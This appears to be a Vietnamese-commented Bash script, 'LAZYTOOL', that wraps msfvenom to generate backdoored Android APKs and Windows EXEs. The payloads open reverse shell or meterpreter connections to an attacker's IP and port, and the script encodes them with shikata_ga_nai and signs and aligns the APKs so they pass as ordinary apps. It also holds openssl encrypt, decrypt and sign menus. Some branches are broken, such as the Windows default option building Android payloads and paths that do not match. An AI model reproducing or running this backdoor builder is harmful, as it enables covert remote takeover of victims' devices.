#!/bin/bash

#Tool chua cac lenh, voi toc do khien chung ta luoi bieng !
#Tac gia : hungvnstar79

banner(){
echo "
 ##::::::::::'###::::'########:'##:::'##:'########::'#######:::'#######::'##:::::::
 ##:::::::::'## ##:::..... ##::. ##:'##::... ##..::'##.... ##:'##.... ##: ##:::::::
 ##::::::::'##:. ##:::::: ##::::. ####:::::: ##:::: ##:::: ##: ##:::: ##: ##:::::::
 ##:::::::'##:::. ##:::: ##::::::. ##::::::: ##:::: ##:::: ##: ##:::: ##: ##:::::::
 ##::::::: #########::: ##:::::::: ##::::::: ##:::: ##:::: ##: ##:::: ##: ##:::::::
 ##::::::: ##.... ##:: ##::::::::: ##::::::: ##:::: ##:::: ##: ##:::: ##: ##:::::::
 ########: ##:::: ##: ########:::: ##::::::: ##::::. #######::. #######:: ########:

 							by: hrekcah
" | lolcat

}

color_off='\033[0m'
black='\033[0;30m'
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[034m'
purple='\033[0;35m'
cyan='\033[0;36m'
white='\033[0;37m'
clear
banner
IP=$1
PORT=$2
pwd=$(pwd)
check(){
	command -v msfvenom > /dev/null 2>&1 || { echo >&2 "Please install msfvenom...";exit 1;}
	sleep 0.5	
	command -v lolcat > /dev/null 2>&1 || { echo >&2 "Please install lolcat...";exit 1;}
	sleep 0.5
	command -v keytool > /dev/null 2>&1 || { echo >&2 "Please install keytool...";exit 1;}
	sleep 0.5
	command -v jarsigner > /dev/null 2>&1 || { echo >&2 "Please install Default-JDK...";exit 1;}
	sleep 0.5
	command -v zipalign > /dev/null 2>&1 || { echo >&2 "Please install zipalign...";exit 1;}
	sleep 0.5
	command -v steghide > /dev/null 2>&1 || { echo >&2 "Please install steghide...";exit 1;}
	sleep 0.5
	command -v openssl > /dev/null 2>&1 || { echo >&2 "Please install openssl...";exit 1;}
	sleep 0.5
	command -v tmux > /dev/null 2>&1 || { echo >&2 "Please install tmux...";exit 1;}
	sleep 0.5
	command -v screen > /dev/null 2>&1 || { echo >&2 "Please install screen...";exit 1;}

}
msfvn(){
	adr(){
		rvs_tcp(){
		tmux new -s ms1 -d msfvenom -p android/shell/reverse_tcp LHOST=${IP} LPORT=${PORT} -e /shikata_ga_nai -i 10 -o backdoor.apk
		}
		rvs_http(){
		tmux new -s ms1 -d msfvenom -p android/shell/reverse_http LHOST=${IP} LPORT=${PORT} -e /shikata_ga_nai -i 10 -o backdoor.apk
		}
		rvs_https(){
		tmux new -s ms1 -d msfvenom -p android/shell/reverse_https LHOST=${IP} LPORT=${PORT} -e /shikata_ga_nai -i 10 -o backdoor.apk
		}
		rv_tcp(){
		tmux new -s ms1 -d msfvenom -p android/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -e /shikata_ga_nai -i 10 -o backdoor.apk
		}
		rv_http(){
		tmux new -s ms1 -d msfvenom -p android/meterpreter/reverse_http LHOST=${IP} LPORT=${PORT} -e /shikata_ga_nai -i 10 -o backdoor.apk
		}
		rv_https(){
		tmux new -s ms1 -d msfvenom -p android/meterpreter/reverse_https LHOST=${IP} LPORT=${PORT} -e /shikata_ga_nai -i 10 -o backdoor.apk
		}
		rvm_tcp(){
		tmux new -s ms1 -d msfvenom -p android/meterpreter_reverse_tcp LHOST=${IP} LPORT=${PORT} -e /shikata_ga_nai -i 10 -o backdoor.apk
		}
		rvm_http(){
		tmux new -s ms1 -d msfvenom -p android/meterpreter_reverse_http LHOST=${IP} LPORT=${PORT} -e /shikata_ga_nai -i 10 -o backdoor.apk
		}
		rvm_https(){
		tmux new -s ms1 -d msfvenom -p android/meterpreter_reverse_https LHOST=${IP} LPORT=${PORT} -e /shikata_ga_nai -i 10 -o backdoor.apk
		}
		echo -en "${red}Choose payload : ${color_off}
	${green}	1.Android/shell/reverse_tcp
		2.Android/shell/reverse_http
		3.Android/shell/reverse_https
		4.Android/meterpreter/reverse_tcp
		5.Android/meterpreter/reverse_http
		6.Android/meterpreter/reverse_https
		7.Android/meterpreter_reverse_tcp
		8.Android/meterpreter_reverse_http
		9.Android/meterpreter_reverse_https
		10.Back${color_off}\n
		"
		read a
		case $a in
			1)rvs_tcp;;
			2)rvs_http;;
			3)rvs_https;;
			4)rv_tcp;;
			5)rv_http;;
			6)rv_https;;
			7)rvm_tcp;;
			8)rvm_http;;
			9)rvm_https;;
			10)menu;;
		esac
	echo -en "${yellow}Su dung Keytool ? (y/n) : ${color_off}"
	read kt
	if [[ ${kt} == "y" || ${kt} == "Y" ]];then
		echo -en "${green}Bi danh : ${color_off}"
		read b
		echo -en "${green}Thuat toan (ex:RSA,DSA,EC)${color_off} "
		read tt
		echo -en "${green}Key size (ex:2048)${color_off} "
		read kz
		keytool -genkeypair -V -keystore key.keyvip -alias ${b} -keyalg ${tt} -keysize ${kz} -validity 10000 << EOF
hhhhhh
hhhhhh
r
r
r
r
r
r
yes
EOF
	else [[ ${kt} == "n" || ${kt} == "N" ]]

	fi
	echo -en "${yellow}Su dung Jarsiger? (y/n) : ${color_off}"
	read jr
	if [[ ${jr} == "y" || ${jr} == "Y" ]];then
		echo -e "${green}Sigalg (ex:SHA1withRSA,SHA256withRSA,SHA1withDSA,SHA256withECDSA,...)${color_off}"
		echo -en "${red}?>${color_off} "
		read s
		echo -e "${green}Digestalg (ex:SHA1,SHA256,...)${color_off}"
		echo -en "${red}?>${color_off} "
		read d
		cat > J.sh << EOF_EOF
#!/bin/bash
while [[ ! -f ~/bashe/payload/backdoor.apk ]];do
sleep 5
jarsigner -verbose -sigalg $s -digestalg $d -keystore key.keyvip backdoor.apk $b << EOF
hhhhhh
EOF
exit
done
EOF_EOF
tmux new -s ii -d bash J.sh
rm J.sh
	sleep .40s
	else [[ ${jr} == "n" || ${jr} == "N" ]]

	fi
	echo -en "${green}Ten file (.apk) : ${color_off}"
	read tf
	sleep 5
	zipalign -v 4 backdoor.apk ${tf}
	sleep .50s
	rm backdoor.apk key.keyvip	
}
		adr2(){
		echo -en "${yellow}Default payload [android/meterpreter/reverse_tcp]? (y/n) : ${color_off}"
		read dff
		if [[ ${dff} == "y" || ${dff} == "Y" ]];then
			echo -en "${green}Ten PayLoad (.apk): ${color_off}"
			read n
			echo -en "${green}So lan lap : ${color_off}"
			read ll
			echo -en "${green}Su dung shikata_ga_nai ?(y/n): ${color_off}"
			read u
			if [[ $u == "y" || $u == "Y" ]];then
		tmux new -s ms1 -d msfvenom -p android/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -e /shikata_ga_nai -i ${ll} -o ${n}
			else [[ $u == "n" || $u == "N" ]]
		tmux new -s ms1 -d msfvenom -p android/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -i ${ll} -o ${n}
			fi
		else [[ ${dff} == "n" || ${dff} == "N" ]]
			adr
		fi
		sleep 3
		echo -e "${green} DONE! ${color_off}"
		}



	win(){ 
		win_rvs(){
		tmux new -s ms2 -d msfvenom -p windows/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -e /shikata_ga_nai -i 10  -f exe -o backdoor.exe
		echo -e "${red}wait....${color_off}"
		}
		win_rvhttp(){
		tmux new -s ms2 -d msfvenom -p windows/meterpreter/reverse_http LHOST=${IP} LPORT=${PORT} -e /shikata_ga_nai -i 10 -f exe -o backdoor.exe
		echo -e "${red}wait....${color_off}"	
		}
		win_rvhttps(){
		tmux new -s ms2 -d msfvenom -p windows/meterpreter/reverse_https LHOST=${IP} LPORT=${PORT} -e /shikata_ga_nai -i 10 -f exe -o backdoor.exe
		echo -e "${red}wait....${color_off}"

		}
		win_rvmtcp(){
		tmux new -s ms2 -d msfvenom -p windows/meterpreter_reverse_tcp LHOST=${IP} LPORT=${PORT} -e /shikata_ga_nai -i 10 -f exe -o backdoor.exe
		echo -e "${red}wait....${color_off}"

		}
		win_rvmhttp(){
		tmux new -s ms2 -d msfvenom -p windows/meterpreter_reverse_http LHOST=${IP} LPORT=${PORT} -e /shikata_ga_nai -i 10 -f exe -o backdoor.exe
		echo -e "${red}wait....${color_off}"

		}
		win_rvmhttps(){
		tmux new -s ms2 -d msfvenom -p windows/meterpreter_reverse_https LHOST=${IP} LPORT=${PORT} -e /shikata_ga_nai -i 10 -f exe -o backdoor.exe
		echo -e "${red}wait....${color_off}"

		}
		win_rvstcp(){
		tmux new -s ms2 -d msfvenom -p windows/shell/reverse_tcp LHOST=${IP} LPORT=${PORT} -e /shikata_ga_nai -i 10 -f exe -o backdoor.exe
		echo -e "${red}wait....${color_off}"

		}
		win_rv_tcp(){
		tmux new -s ms2 -d msfvenom -p windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -e /shikata_ga_nai -i 10 -f exe -o backdoor.exe
		echo -e "${red}wait....${color_off}"

		}

	echo -en "${red}Choose payload : ${color_off}
	${green}        1.Window/meterpreter/reverse_tcp
		2.Windows/meterpreter/reverse_http
		3.Windows/meterpreter/reverse_https
		4.Windows/meterpreter_reverse_tcp
		5.Windows/meterpreter_reverse_http
		6.Windows/meterpreter_reverse_https
		7.windows/shell/reverse_tcp
		8.windows/shell_reverse_tcp
		9.Back${color_off}\n"
		read b
		case $b in
			1)win_rvs;;
			2)win_rvhttp;;
			3)win_rvhttps;;
			4)win_rvmtcp;;
			5)win_rvmhttp;;
			6)win_rvmhttps;;
			7)win_rvstcp;;
			8)win_rv_tcp;;
			9)menu;;
		esac
	}
	win2(){
		echo -en "${yellow}Default payload [windows/meterpreter/reverse_tcp]? (y/n) : ${color_off}"
		read wi
		if [[ ${wi} == "y" || ${wi} == "Y" ]];then
			echo -en "${green}Ten PayLoad (.exe): ${color_off}"
			read na
			echo -en "${green}So lan lap : ${color_off}"
			read l
			echo -en "${green}Su dung shikata_ga_nai ?(y/n): ${color_off}"
			read uu
			if [[ $uu == "y" || $uu == "Y" ]];then
		tmux new -s ms1 -d msfvenom -p android/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -e /shikata_ga_nai -i ${l} -o ${na}
			else [[ $uu == "n" || $uu == "N" ]]
		tmux new -s ms1 -d msfvenom -p android/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -i ${l} -o ${na}
			fi
		else [[ ${wi} == "n" || ${wi} == "N" ]]
			win
		fi
		sleep 8.5
		echo -e "${green} DONE! ${color_off}"

	}

	


echo -e "${purple}Payload msfvenom : ${color_off}
	 	${blue}1) Android
		2) Window
		3) Exit
		${color_off}
		"
		read ms
		case $ms in
		1)adr2;;
		2)win2;;
		3)menu;;
	esac
	}




encryptt(){
	mot(){
		sleep 0.5
		echo -en "${blue}MA HOA KHONG DOI XUNG${color_off}\n"
		mkdir .key
cat > K.sh << EOF
#!/bin/bash
while [[ ! -f ~/bashell/payload/.key/key.pem ]];do
sleep 5
openssl rsa -in .key/key.pem -pubout -out .key/pkey.pem
done
EOF
chmod 777 K.sh
screen -dmS i bash K.sh
#tmux new -s k -d bash K.sh
sleep 1
rm K.sh
		echo -en "${yellow}Path file hoac file: ${color_off}"
		read x
		echo -en "${yellow}Key size(default 3000): ${color_off}"
		read key
		dock(){
			if [[ $kf == "y" || $kf == "Y" ]];then
			tmux new -s key -d openssl genrsa -out .key/key.pem $key
		else [[ $kf == "n" || $kf == "N" ]]
				encryptt
		fi
		}
		if [[ $key == "" ]];then
		openssl genrsa -out .key/key.pem 3000
	elif [[ $key -gt 7500 ]];then
		sleep 0.3
		echo -en "${red}Do key size qua lon, nen chung toi se su dung trinh D, continue(y/n) ? ${color_off}"
		read kf
		dock
		else
			openssl genrsa -out .key/key.pem $key
		fi
	cat > E.sh << EOF
#!/bin/bash
while [[ ! -f ~/ashell/payload/.key/pkey.pem ]];do
sleep 5
openssl rsautl -encrypt -pubin -inkey .key/pkey.pem -in $x -out encrypt
done
EOF
chmod 777 E.sh
tmux new -s enn -d bash E.sh
rm E.sh
sleep 5


tmux kill-session -t enn #nhieu luc tai cac dong khit nhau nen khong thuc hien lenh
#echo -e "${green}Run: ${red}tmux kill-session -t enn${color_off}"
		#tmux kill-session -t enn
#if [[ -f ~/bashel/payload/encrypt ]];then
#	tmux kill-session -t enn	
#fi
	}
	hai(){
		sleep 0.5
		echo -e "${blue}<MA HOA CONG HUONG>${color_off}"
		echo -en "${green}File encrypt : ${color_off}"
		read w
		echo -en "${green}Output : ${color_off}"
		read z
		openssl aes-256-cbc -salt -a -e -in $w -out $z
	}
	echo -en "${green}Ma Hoa (use openssl):${color_off}
	1. Ma hoa khong doi xung(Asymmetric encryption).
	2. Ma hoa cong huong(Symmetic encryption).
	3. Ma hoa file(Encryption file).
	4. Ky va xac minh(verified file).
	5. Back.
	
	"
	read crycry
	ba(){
		sleep 0.5
		echo -e "${blue}<Ma hoa file>${color_off}"
		mkdir .key
		teptxt(){
		echo -en "${yellow}Path File or File: ${color_off}"
		read v
		echo -en "${yellow}Key size(default 8000): ${color_off}"
		read keyy
	if [[ $keyy == "" ]];then
			openssl genrsa -aes256 -out .key/keyy.pem 8000
	else
		openssl genrsa -aes256 -out .key/keyy.pem $keyy
		fi
	openssl req -x509 -new -days 100000 -key .key/keyy.pem -out .key/kckey.pem
	sleep 0.2
	echo -en "${yellow}Output (default: encrypt): ${color_off}"
	read mn
	if [[ $mn == "" ]];then
	openssl smime -encrypt -aes-256-cbc -in $v -out encrypt -outform DER .key/kckey.pem
	else
		openssl smime -encrypt -aes-256-cbc -in $v -out $mn -outform DER .key/kckey.pem
	fi
	}
	tepzip(){
		echo -en "${yellow}Path File or File : ${color_off}"
		read h
		echo -en "${yellow}Key size(default 8000): ${color_off}"
		read yek
		if [[ $yek == "" ]];then
			openssl genrsa -aes256 -out .key/keyy.pem 8000
		else
			openssl genrsa -aes256 -out .key/keyy.pem $yek
		fi
		openssl req -x509 -new -days 100000 -key .key/keyy.pem -out .key/kckey.pem
		sleep 0.2
		echo -en "${yellow}Output (default: encrypt.zip): ${color_off}"
		read nm
		if [[ $nm == "" ]];then
			openssl smime -encrypt -binary -aes-256-cbc -in $h -out encrypted.zip -outform DER .key/kckey.pem
		else
			openssl smime -encrypt -binary -aes-256-cbc -in $h -out $nm -outform DER .key/kckey.pem
		fi
	}
		echo -en "${green}File zip(1), File txt(2): ${color_off}"
		read ef
		case $ef in
			1)tepzip;;
			2)teptxt;;
			3)encrypt;;
			*)menu;;
		esac
	}
	kyy(){
		sleep 0.5
		echo -e "${blue}<KY VA XAC MINH>${color_off}"
		mkdir .key
		echo -en "${yellow}Path File or File : ${color_off}"
		read xxx
		echo -en "${yellow}Key size(default 4000): ${color_off}"
		read keyyy
		docck(){
			if [[ $kc == "y" || $kc == "Y" ]];then
				tmux new -s keyy -d openssl genrsa -out .key/Key.pem $keyyy
				sleep 0.2
				openssl rsa -in .key/Key.pem -pubout -out .key/Pkey.pem
			else [[ $kc == "n" || $kc == "N" ]]
				encryptt
			fi
	}
		if [[ $keyyy == "" ]];then
			openssl genrsa -out .key/Key.pem 4000
			sleep 0.2
			openssl rsa -in .key/Key.pem -pubout -out .key/Pkey.pem
		elif [[ $keyyy -gt 7500 ]];then
		sleep 0.3
		echo -en "${red}Do key size qua lon, nen chung toi su dung trinh D, continue(y/n) ? ${color_off}"
		read kc
		docck
	else
		openssl genrsa -out .key/Key.pem $keyyy
		sleep 0.2
		openssl rsa -in .key/Key.pem -pubout -out .key/Pkey.pem
		fi
		sleep 0.3
		openssl dgst -sha512 -sign .key/Key.pem -out ky.sha512 $xxx
		sleep 0.3
		openssl dgst -sha512 -verify .key/Pkey.pem -signature ky.sha512 $xxx
		sleep 0.3
		rm -rf .key ky.sha512
	}
	case $crycry in
		1)mot;;
		2)hai;;
		3)ba;;
		4)kyy;;
		5)menu;;
	esac
	}
decryptt(){
	mott(){
		echo -en "${yellow}File giai ma(default: encrypt): ${color_off}"
		read jk
		echo -en "${yellow}Output : ${color_off}"
		read out
		if [[ $jk == "" ]];then
		openssl rsautl -decrypt -inkey .key/key.pem -in encrypt -out $out
		rm encrypt
		else
		openssl rsautl -decrypt -inkey .key/key.pem -in $jk -out $out
		rm $jk
		fi
		sleep 0.2
		rm -rf .key
	}
	haii(){
		echo -en "${yellow}File giai ma: ${color_off}"
		read s
		echo -en "${yellow}Output : ${color_off}"
		read j
		openssl aes-256-cbc -salt -a -d -in $s -out $j
		rm $s

	}
	baa(){
		detxt(){
		echo -en "${yellow}File giai ma(default: encrypt): ${color_off}"
		read kj
		echo -en "${red}Mat Khau: ${color_off}"
		read hh
		echo -en "${yellow}Output: ${color_off}"
		read lk
		if [[ $kj == "" ]];then
	openssl smime -decrypt -in encrypt -inform DER -out $lk -inkey .key/keyy.pem -passin pass:$hh
		else
	openssl smime -decrypt -in $kj -inform DER -out $lk -inkey .key/keyy.pem -passin pass:$hh
		fi
		sleep 0.2
		rm -rf .key
	}
		dezip(){
		echo -en "${yellow}File giai ma(default: encrypt.zip): ${color_off}"
		read jk
		echo -en "${red}Mat khau: ${color_off}"
		read hk
		echo -en "${yellow}Output: ${color_off}"
		read kl
		if [[ $kj == "" ]];then
		openssl smime -decrypt -binary -in encrypted.zip -inform DER -out $kl -inkey .key/keyy.pem -passin pass:$hk
	else
		openssl smime -decrypt -binary -in $jk -inform DER -out $kl -inkey .key/keyy.pem -passin pass:$hk
		fi
		sleep 0.2
		rm -rf .key
		}
	echo -en "${yellow}Giai ma file zip(1), giai ma file txt(2): ${color_off}"
	read dfg
	case $dfg in
		1)dezip;;
		2)detxt;;
		3)encrypt;;
		*)menu;;
	esac
	}
	echo -en "${green}Giai ma(openssl) : ${color_off}
	1. Giai ma khong doi xung(Asymmetric decryption).
	2. Giai ma cong huong(Symmetic decryption).
	3. Giai ma file(Decrytion file).
	4. Back.

	"
	read decry
	case $decry in
		1)mott;;
		2)haii;;
		3)baa;;
		4)menu;;
	esac
}
menu(){
	echo -e "${red}Payload : ${color_off}
        ${green}[1]${color_off}Msfvenom.
	${green}[2]${color_off}Encrypt.
	${green}[3]${color_off}Decrypt.
	${green}[4]${color_off}Exit.
        "
	while true;do
		choose
		read chon
        case $chon in
                1)msfvn;;
		2)encryptt;;
		3)decryptt;;
		4)exit 1;;
        esac
done
}
choose(){
	echo -en "${green}Choose Payload : ${color_off}"
}
pwd=$(pwd)
if [[ -z $1 ]] && [[ -z $2 ]];then
	sleep 1
	check
	echo -e "${red}Usege : ${color_off}<${green}ip${color_off}><${green}port${color_off}>"
	exit 1;
else
	check
	menu
fi
